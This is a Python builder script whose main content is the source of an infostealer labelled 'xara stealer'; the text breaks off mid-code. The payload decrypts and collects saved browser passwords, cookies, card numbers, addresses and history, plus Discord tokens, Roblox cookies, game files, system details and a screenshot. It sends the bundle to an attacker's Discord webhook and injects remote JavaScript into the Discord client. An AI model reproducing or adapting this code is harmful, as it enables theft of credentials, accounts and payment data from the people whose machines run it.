from os import name, chdir, rmdir, mkdir, rename, listdir
from os.path import isdir
from pystyle import Anime, Colorate, Colors, Center, System, Write
from random import choice, shuffle, randint
from binascii import hexlify
from shutil import rmtree
import os



class Make:
    def grab(webhook: str) -> str:
        return r"""from lib2to3.pgen2 import token
import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback
from threading import Thread
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
from json import loads, dumps
from shutil import copy
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from re import findall
import os
import sys
import win32con
import browser_cookie3
from json import loads, dumps
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from cpuinfo import get_cpu_info
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from pyautogui import screenshot
from random import choices
from string import ascii_letters, digits





config = {
    'webhook': '""" + webhook + r"""', 
    'persist': True,
    'keep-alive': False,
    'injection_url': 'https://github.com/Xara-01/Discord-Injection/blob/master/injection.js',
    'inject': True,
    'hideconsole': True,
    'antivm': False,
    'force_admin': False,
    'black_screen': False,
    'error': False,
    'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.',
}
class functions(object):
    def getHeaders(self, token:str=None, content_type="application/json") -> dict:
        headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
        if token: headers.update({"Authorization": token})
        return headers
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f: local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception: return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'
    def fsize(self, path):
        path = internal.tempfolder + os.sep + path
        if os.path.isfile(path): size = os.path.getsize(path)/1024
        else:
            total = 0
            with os.scandir(path) as it:
                for entry in it:
                    if entry.is_file():
                        total += entry.stat().st_size
                    elif entry.is_dir():
                        total += self.fsize(entry.path)
            size = total/1024
        if size > 1024: size = "{:.1f} MB".format(size/1024)
        else: size = "{:.1f} KB".format(size)
        return size
    def gen_tree(self, path):
        ret = ""
        fcount = 0
        for dirpath, dirnames, filenames in os.walk(path):
            directory_level = dirpath.replace(path, "")
            directory_level = directory_level.count(os.sep)
            indent = "│ "
            ret += f"\n{indent*directory_level}📁 {os.path.basename(dirpath)}/"
            for n, f in enumerate(filenames):
                if f == f'StealFile By xara stealer.zip': continue
                indent2 = indent if n != len(filenames) - 1 else "└ "
                ret += f"\n{indent*(directory_level)}{indent2}{f} ({self.fsize((os.path.basename(dirpath)+os.sep if dirpath.split(os.sep)[-1] != internal.tempfolder.split(os.sep)[-1] else '')+f)})"
                fcount += 1
        return ret, fcount
    def system(self, action):
        return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())
class internal:
    tempfolder = None
    stolen = False
class ticks(functions, internal):
    def __init__(self,useless):
        del useless
        if config.get('error'): Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get('error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()
        try: admin = ctypes.windll.shell32.IsUserAnAdmin()
        except Exception: admin = False
        if not admin and config['force_admin'] and '--nouacbypass' not in sys.argv: self.forceadmin()
        self.webhook = config.get('webhook')
        self.exceptions = []
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        dirs = [
            self.appdata,
            self.roaming,
            os.getenv('temp'),
            'C:\\Users\\Public\\Public Music',
            'C:\\Users\\Public\\Public Pictures',
            'C:\\Users\\Public\\Public Videos',
            'C:\\Users\\Public\\Public Documents',
            'C:\\Users\\Public\\Public Downloads',
            os.getenv('userprofile'),
            os.getenv('userprofile') + '\\Documents',
            os.getenv('userprofile') + '\\Music',
            os.getenv('userprofile') + '\\Pictures',
            os.getenv('userprofile') + '\\Videos'
        ]
        while True:
            rootpath = random.choice(dirs)
            if os.path.exists(rootpath):
                self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
                break
        internal.tempfolder = self.tempfolder

        self.browserpaths = {
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data',
            'Iridium': self.appdata + r'\\Iridium\\User Data',
            'Chromium': self.appdata + r'\\Chromium\\User Data'
        }
        self.stats = {
            'passwords': 0,
            'tokens': 0,
            'phones': 0,
            'addresses': 0,
            'cards': 0,
            'cookies': 0
        }
        try:
            os.makedirs(os.path.join(self.tempfolder), 0x1ED, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x2)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x4)
            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x256)
        except Exception: self.exceptions.append(traceback.format_exc())
        os.chdir(self.tempfolder)
        if config.get('persist') and not self.stolen: Thread(target=self.persist).start()
        if config.get('inject'): Thread(target=self.injector).start()
        self.tokens = []
        self.robloxcookies = []
        self.files = ""
        
        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.grabGDSave),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]
        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))
        for thread in threads: thread.start()
        for thread in threads: thread.join()
        
        if self.exceptions:
            with open(self.tempfolder+'\\Exceptions.txt','w',encoding='utf-8') as f:
                f.write('\n'.join(self.exceptions))

        self.SendInfo()

        shutil.rmtree(self.tempfolder)
        if config.get('black_screen'): self.system('start ms-cxh-full://0')
    def tokenRun(self):
        self.grabTokens()
        self.neatifyTokens()
    def getSysInfo(self):
            with open(self.tempfolder+f'\\PC Info.txt', "w", encoding="utf8", errors='ignore') as f:
                try: cpu = self.system(r'wmic cpu get name').splitlines()[1]
                except Exception: cpu = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: gpu = self.system(r'wmic path win32_VideoController get name').splitlines()[1]
                except Exception: gpu = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: screensize = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
                except Exception: screensize = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: refreshrate = self.system(r'wmic path win32_VideoController get currentrefreshrate').splitlines()[1]
                except Exception: refreshrate = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: osname = 'Windows ' + self.system(r'wmic os get version').splitlines()[1]
                except Exception: osname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: systemslots = self.system(r'wmic systemslot get slotdesignation,currentusage,description,status')
                except Exception: systemslots = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: processes = self.system(r'tasklist')
                except Exception: processes = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: installedapps = '\n'.join(self.system(r'powershell Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName').splitlines()[3:])
                except Exception: installedapps = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: path = self.system(r'set').replace('=',' = ')
                except Exception: path = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: buildmnf = self.system(r'wmic bios get manufacturer').splitlines()[1]
                except Exception: buildmnf = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: modelname = self.system(r'wmic csproduct get name').splitlines()[1]
                except Exception: modelname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: hwid = self.system(r'wmic csproduct get uuid').splitlines()[1]
                except Exception: hwid = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: avlist = ', '.join(self.system(r'wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayname').splitlines()[1:])
                except Exception: avlist = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: username = os.getlogin()
                except Exception: username = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: pcname = self.system(r'hostname')
                except Exception: pcname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: productinfo = self.getProductValues()
                except Exception: productinfo = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: buildname = productinfo[0]
                except Exception: buildname = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: windowskey = productinfo[1]
                except Exception: windowskey = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
                except Exception: ram = 'N/A'; self.exceptions.append(traceback.format_exc())
                try: disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
                except Exception: disk = 'N/A'; self.exceptions.append(traceback.format_exc())
                sep = '='*40
                f.write(f'''{sep}
                HARDWARE 
{sep}

CPU: {cpu}
GPU: {gpu}

RAM: {ram} GB
Disk Size: {disk} GB

PC Manufacturer: {buildmnf}
Model Name: {modelname}

Screen Info:
Resolution: {screensize}
Refresh Rate: {refreshrate}Hz

System Slots:
{systemslots}

{sep}
                   OS
{sep}

Username: {username}
PC Name: {pcname}

Build Name: {osname}
Edition: {buildname}
Windows Key: {windowskey}
HWID: {hwid}
Antivirus: {avlist}

{sep}
                  PATH
{sep}

{path}

{sep}
             INSTALLED APPS
{sep}

{installedapps}

{sep}
            RUNNING PROCESSES
{sep}

{processes}
''')

    def checkToken(self, tkn, source):
        try:
            r = requests.get(self.baseurl, headers=self.getHeaders(tkn))
            if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:
                self.tokens.append((tkn, source))
                self.stats['tokens'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
    def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            with open(bd, 'r', encoding="utf8", errors='ignore') as f:
                txt = f.read()
                content = txt.replace('api/webhooks', 'api/nethooks')
            with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
    def grabBrowserInfo(self, platform, path):
        if os.path.exists(path):
            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''
            sep = '='*40
            fname = lambda x: f'\\{platform} Info ({x}).txt'
            formatter = lambda p, c, h, m: f'Browser: {platform}\n\n{sep}\n               PASSWORDS\n{sep}\n\n{p}\n{sep}\n                COOKIES\n{sep}\n\n{c}\n{sep}\n                HISTORY\n{sep}\n\n{h}\n{sep}\n               OTHER INFO\n{sep}\n\n{m}'
            profiles = ['Default']
            for dir in os.listdir(path):
                if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)
            if platform in [
                'Opera',
                'Opera GX',
                'Amigo',
                'Torch',
                'Kometa',
                'Orbitum',
                'CentBrowser',
                '7Star',
                'Sputnik',
                'Chrome SxS',
                'Epic Privacy Browser',
            ]:
                cpath = path + '\\Network\\Cookies'
                ppath = path + '\\Login Data'
                hpath = path + '\\History'
                wpath = path + '\\Web Data'
                mkpath = path + '\\Local State'
                fname = f'\\{platform} Info (Default).txt'
                threads = [
                    Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),
                    Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),
                    Thread(target=self.grabHistory,args=[mkpath,platform,'Default',hpath]),
                    Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])
                ]
                for x in threads:
                    x.start()
                for x in threads:
                    x.join()
                try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabHistory(mkpath,fname,hpath); self.grabMisc(mkpath,fname,wpath)
                except Exception: self.exceptions.append(traceback.format_exc())
            else:
                for profile in profiles:
                    cpath = path + f'\\{profile}\\Network\\Cookies'
                    ppath = path + f'\\{profile}\\Login Data'
                    hpath = path + f'\\{profile}\\History'
                    wpath = path + f'\\{profile}\\Web Data'
                    mkpath = path + '\\Local State'
                    fname = f'\\{platform} Info ({profile}).txt'
                    threads = [
                        Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),
                        Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),
                        Thread(target=self.grabHistory,args=[mkpath,platform,profile,hpath]),
                        Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])
                    ]
                    for x in threads:
                        x.start()
                    for x in threads:
                        x.join()
            with open(self.tempfolder+f'\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
                if self.formatted_cookies:
                    m.write(self.formatted_cookies)
                else:
                    m.close()
                    os.remove(self.tempfolder+f'\\{platform} Cookies ({profile}).txt')
                
                if self.passwords_temp or self.cookies_temp or self.history_temp or self.misc_temp:
                    f.write(formatter(self.passwords_temp, self.cookies_temp, self.history_temp, self.misc_temp))
                else:
                    f.close()
                    os.remove(self.tempfolder+fname)
    def injector(self):
        self.bypassBetterDiscord()
        for dir in os.listdir(self.appdata):
            if 'discord' in dir.lower():
                discord = self.appdata+f'\\{dir}'
                disc_sep = discord+'\\'
                for _dir in os.listdir(os.path.abspath(discord)):
                    if re.match(r'app-(\d*\.\d*)*', _dir):
                        app = os.path.abspath(disc_sep+_dir)
                        for x in os.listdir(os.path.join(app,'modules')):
                            if x.startswith('discord_desktop_core-'):
                                inj_path = app+f'\\modules\\{x}\\discord_desktop_core\\'
                                if os.path.exists(inj_path):
                                    f = requests.get(config.get('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                                    with open(inj_path+'index.js', 'w', errors="ignore") as indexFile: indexFile.write(f)

    def getProductValues(self):
        try: wkey = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
        except Exception: wkey = "N/A (Likely Pirated)"
        try: productName = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName")
        except Exception: productName = "N/A"
        return [productName, wkey]
    def grabPasswords(self,mkp,bname,pname,data):
        self.passwords_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(encrypted_password, master_key)
                if url != "":
                    self.passwords_temp += f"\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n"
                    self.stats['passwords'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabCookies(self,mkp,bname,pname,data):
        self.cookies_temp = ''
        self.formatted_cookies = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    self.cookies_temp += f"\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n"
                    self.formatted_cookies += f"{host}	TRUE	/	FALSE	1708726694	{user}	{decrypted_cookie}\n"
                    self.stats['cookies'] += 1
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabHistory(self,mkp,bname,pname,data):
        self.history_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_HISTORY.db'.replace(' ','_'))
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT title, url, visit_count, last_visit_time FROM urls")
            for r in cursor.fetchall()[::-1]:
                title = r[0]
                url = r[1]
                count = r[2]
                time = r[3]
                time_neat = str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time))[:-7].replace('-','/')
                if url != "":
                    self.history_temp += f"\nURL: {title}\nTitle: {url}\nVisit Count: {count}\nLast Visited: {time_neat}\n"
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabMisc(self,mkp,bname,pname,data):
        self.misc_temp = ''
        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_WEBDATA.db'.replace(' ','_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try: shutil.copy2(login_db, newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT street_address, city, state, zipcode FROM autofill_profiles")
            for r in cursor.fetchall():
                Address = r[0]
                City = r[1]
                State = r[2]
                ZIP = r[3]
                if Address != "":
                    self.misc_temp += f"\nAddress: {Address}\nCity: {City}\nState: {State}\nZIP Code: {ZIP}\n"
                    self.stats['addresses'] += 1
            cursor.execute("SELECT number FROM autofill_profile_phones")
            for r in cursor.fetchall():
                Number = r[0]
                if Number != "":
                    self.misc_temp += f"\nPhone Number: {Number}\n"
                    self.stats['phones'] += 1
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for r in cursor.fetchall():
                Name = r[0]
                ExpM = r[1]
                ExpY = r[2]
                decrypted_card = self.decrypt_val(r[3], master_key)
                if decrypted_card != "":
                    self.misc_temp += f"\nCard Number: {decrypted_card}\nName on Card: {Name}\nExpiration Month: {ExpM}\nExpiration Year: {ExpY}\n"
                    self.stats['cards'] += 1
        except Exception: self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try: os.remove(newdb)
        except Exception: self.exceptions.append(traceback.format_exc())
    def grabRobloxCookie(self):
        try: self.robloxcookies.append(self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY"))
        except Exception: pass
        if self.robloxcookies:
            with open(self.tempfolder+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies: f.write(i+'\n')
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\<PROFILE>',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\<PROFILE>',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data\\<PROFILE>',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\<PROFILE>',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\<PROFILE>',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\<PROFILE>',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\<PROFILE>',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\<PROFILE>',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\<PROFILE>'
        }
        for source, path in paths.items():
            if not os.path.exists(path.replace('<PROFILE>','')): continue
            if "discord" not in path:
                profiles = ['Default']
                for dir in os.listdir(path.replace('<PROFILE>','')):
                    if dir.startswith('Profile '):
                        profiles.append(dir)
                for profile in profiles:
                    newpath = path.replace('<PROFILE>',profile) + r'\\Local Storage\\leveldb\\'
                    for file_name in os.listdir(newpath):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                        for line in [x.strip() for x in open(f'{newpath}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}", line): self.checkToken(token, f'{source} ({profile})')
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line): token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State')); self.checkToken(token, source)
        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'): continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line): self.checkToken(token, 'Firefox')
                            


    def neatifyTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w+", encoding="utf8", errors='ignore')
        for info in self.tokens:
            token = info[0]
            j = requests.get(self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            try: nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            except Exception: self.exceptions.append(traceback.format_exc())
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            try: billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            except Exception: self.exceptions.append(traceback.format_exc())
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nPlatform: {info[1]}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.seek(0)
        content = f.read()
        f.close()
        if not content:
            os.remove(self.tempfolder+"\\Discord Info.txt")
    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None, 
            include_layered_windows=False, 
            all_screens=True, 
            xdisplay=None
        )
        image.save(self.tempfolder + "\\Screenshot.png")
        image.close()

    def grabMinecraftCache(self):
        if not os.path.exists(os.path.join(self.roaming, '.minecraft')): return
        minecraft = os.path.join(self.tempfolder, 'Minecraft Cache')
        os.makedirs(minecraft, exist_ok=True)
        mc = os.path.join(self.roaming, '.minecraft')
        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']

        for _file in to_grab:
            if os.path.exists(os.path.join(mc, _file)):
                shutil.copy2(os.path.join(mc, _file), minecraft + os.sep + _file)
    def grabGDSave(self):
        if not os.path.exists(os.path.join(self.appdata, 'GeometryDash')): return
        gd = os.path.join(self.tempfolder, 'Geometry Dash Save')
        os.makedirs(gd, exist_ok=True)
        gdf = os.path.join(self.appdata, 'GeometryDash')
        to_grab = ['CCGameManager.dat']

        for _file in to_grab:
            if os.path.exists(os.path.join(gdf, _file)):
                shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
    def SendInfo(self):
        wname = self.getProductValues()[0]
        wkey = self.getProductValues()[1]
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("https://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception: self.exceptions.append(traceback.format_exc())
        _zipfile = os.path.join(self.tempfolder, f'Stealed-File.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                if filename == f'Stealed-File.zip': continue
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        self.files, self.fileCount = self.gen_tree(self.tempfolder)
        self.fileCount =  f"{self.fileCount} File{'s' if self.fileCount != 1 else ''} Found: "

        
        
        embed = {
            "username": f"xara stealer | v2.0.0",
            "content": "@everyone",
            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png",
            "embeds": [
                {
                    "author": {
                        "name": "xara stealer | strikes again !",
                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1053234733875740682/xg.png"
                    },
                    "description": f'⭐ **__system info__**. ⭐\n\n💻・**Computer Name:** {os.getenv("COMPUTERNAME")}\n<:win:1053244330611064832>・**{wname}:** {wkey if wkey else "No Product Key!"}\n👀・**IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n🌆・**City:** {city}\n🔎・**Region:** {region}\n🏙・**Country:** {country}\n[Google Maps Location]({googlemap})\n```ansi\n\u001b[32m{self.fileCount}\u001b[35m{self.files}``````ansi\n\u001b[32mStats:\n\u001b[35mPasswords Found: {self.stats["passwords"]}\nCookies Found: {self.stats["cookies"]}\nPhone Numbers Found: {self.stats["phones"]}\nCards Found: {self.stats["cards"]}\nAddresses Found: {self.stats["addresses"]}\nTokens Found: {self.stats["tokens"]}\nTime: {"{:.2f}".format(time.time() - self.starttime)}s```',
                    "color": 0x00000F,
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965754587267092/mp4.gif"
